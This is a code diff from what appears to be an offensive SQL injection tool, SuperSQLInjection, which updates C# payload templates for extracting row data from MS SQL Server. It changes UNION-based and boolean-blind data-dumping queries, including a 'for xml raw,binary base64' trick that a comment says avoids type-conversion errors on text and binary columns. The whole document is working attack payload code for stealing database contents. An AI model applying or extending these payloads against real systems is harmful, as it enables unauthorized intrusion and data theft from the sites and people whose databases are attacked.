@@ -57,9 +57,14 @@ namespace SuperSQLInjection.payload
 
         //每个unicode值范围0-9
         public static String bool_unicode_value = " (substring({data},{index},1))>{len}";
-        
+
         //获取行数据
-        public static String data_value = "(select top 1 {data} from (select top {index} {allcolumns} from [{dbname}]..[{table}] order by {orderby}) t order by {orderby} desc)";
+        //public static String data_value = "(select top 1 {data} from (select top {index} {allcolumns} from [{dbname}]..[{table}] order by {orderby}) t order by {orderby} desc)";
+
+        //解决存在text，BINARY等多种数据类型时，转换报错导致无法获取数据的问题
+        public static String data_value = "(select top 1 {data} from (select top {index} * from [{dbname}]..[{table}] order by {orderby}) t order by {orderby} desc for xml raw,binary base64)";
+        
+
 
         //union获取值
         public static String union_value = " 1=2 union all select {data}";
@@ -108,14 +113,14 @@ namespace SuperSQLInjection.payload
         public static String getUnionDataValue(int columnsLen,int showIndex,String Fill,String dbname,String table,List<String> columns,int index)
         {
             StringBuilder sb = new StringBuilder();
-            String data = data_value.Replace("{data}", concatAllColumnsByConcatStr(columns)).Replace("{allcolumns}", concatAllColumns(columns)).Replace("{orderby}", columns[0]);
+            String data = data_value.Replace("{data}", Comm.unionColumns(columns,",")).Replace("{orderby}", columns[0]);
             for (int i = 1; i <= columnsLen; i++)
             {
 
                 if (i == showIndex)
                 {
-                    String d = data.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{data}", concatAllColumnsByConcatStr(columns)).Replace("{index}", index.ToString());
-                    sb.Append("(char(94)+char(94)+char(33)+cast(" + d + " as varchar(8000))+char(33)+char(94)+char(94)),");
+                    String d = data.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index.ToString());
+                    sb.Append("(char(94)+char(94)+char(33)+" +d+ "+char(33)+char(94)+char(94)),");
                 }
                 else
                 {
@@ -244,7 +249,7 @@ namespace SuperSQLInjection.payload
             foreach (String column in columns)
             {
 
-                sb.Append("cast(isnull(" + column + ",0x20) as varchar(5000))+char(36)+char(36)+char(36)+");
+                sb.Append("cast(isnull(" + column + ",space(1)) as varchar(5000))+char(36)+char(36)+char(36)+");
             }
             sb.Remove(sb.Length - 28, 28);
             return sb.ToString();
@@ -260,7 +265,7 @@ namespace SuperSQLInjection.payload
         /// <returns></returns>
         public static String getBoolDataPayLoad(String column,List<String> columns,String dbName,String table,int index)
         {
-            String data = data_value.Replace("{data}", "cast(isnull("+column+",0x20) as varchar)").Replace("{allcolumns}", concatAllColumns(columns)).Replace("{orderby}", columns[0]);
+            String data = data_value.Replace("{data}", "cast(isnull("+column+ ",space(1)) as varchar)").Replace("{allcolumns}", concatAllColumns(columns)).Replace("{orderby}", columns[0]);
             String payload = data.Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index.ToString());
             return payload;
         }
